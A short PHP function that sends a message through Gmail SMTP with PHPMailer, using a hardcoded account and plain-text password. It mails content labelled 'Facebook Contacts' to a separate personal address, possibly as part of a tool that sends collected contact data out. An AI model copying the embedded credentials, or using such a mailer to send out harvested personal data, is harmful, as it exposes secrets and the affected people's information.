<?php

function sendEmail($message) {

$mail = new PHPMailer();

	
	$mail -> SMTPDebug = 0;
	$mail -> IsSMTP();
	$mail -> SMTPSecure = "ssl";
	$mail -> Host = "smtp.gmail.com";
	$mail -> Port = 465;
	//$mail->Host="ssl://smtp.gmail.com"; //------> work in lennox.....ubuntu
	//$mail->Port=25;
	$mail -> SMTPAuth = true;
$mail->Username="tajtaj301@gmail.com";
$mail->Password="1234567890!";

$mail->FromName="Facebook Contacts";
$mail->From="tajtaj301@gmail.com";
$mail->AddAddress("mkhader88@gmail.com","Test email");
$mail->Subject="Facebook Contacts";
$mail->Body=$message;


$result=$mail->Send();
	echo $result ? '1' : '0';

}
?>